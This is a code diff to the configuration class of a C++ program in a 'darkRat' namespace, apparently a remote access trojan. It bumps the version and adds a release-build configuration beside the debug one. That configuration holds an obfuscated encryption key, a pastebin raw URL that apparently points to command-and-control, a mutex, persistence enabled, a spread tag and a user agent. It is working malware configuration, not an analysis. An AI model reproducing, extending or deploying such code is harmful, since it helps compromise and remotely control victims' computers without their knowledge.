@@ -34,7 +34,7 @@ namespace darkRat
 			std::string persistence;
 			std::string spreadtag;
 			std::string useragent;
-			std::string versionID = "2.1.2";
+			std::string versionID = "2.1.3";
 			std::string encryptionKey;
 			config(std::string ek, std::string pu, std::string mux, std::string sup, std::string ri, std::string per, std::string st, std::string ua, std::list<std::string> pn)
 			{
@@ -76,7 +76,6 @@ namespace darkRat
 					std::string spreadtag = j_config["st"];
 					std::string useragent = j_config["ua"];
 					std::list<std::string> pn = j_config["pn"];
-
 					return config(ek, pu, mux, sup, ri, pre, spreadtag, useragent, pn);
 				}
 			}
@@ -84,7 +83,7 @@ namespace darkRat
 
 			}
 
-			
+#if _DEBUG
 			return config(OBFUSCATE("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>"),
 				OBFUSCATE("http://pastebin.com/raw/wJJPteV2"), //Debug
 				OBFUSCATE("3mCUq1z"),
@@ -95,6 +94,21 @@ namespace darkRat
 				OBFUSCATE("SUq1rx"),
 				{}
 			);
+#endif
+#if NDEBUG 
+			return config(OBFUSCATE("1YqsiIPGf3mCzRuKqo46ZohUKeZFzTDH"),
+				OBFUSCATE("https://pastebin.com/raw/Qq0sfw23"), //Debug
+				OBFUSCATE("Qq0sfw23"),
+				OBFUSCATE("true"),
+				OBFUSCATE("600"),
+				OBFUSCATE("true"),
+				OBFUSCATE("main"),
+				OBFUSCATE("SUq1rx"),
+				{}
+			);
+#endif
+			
+			
 			
 
 		}
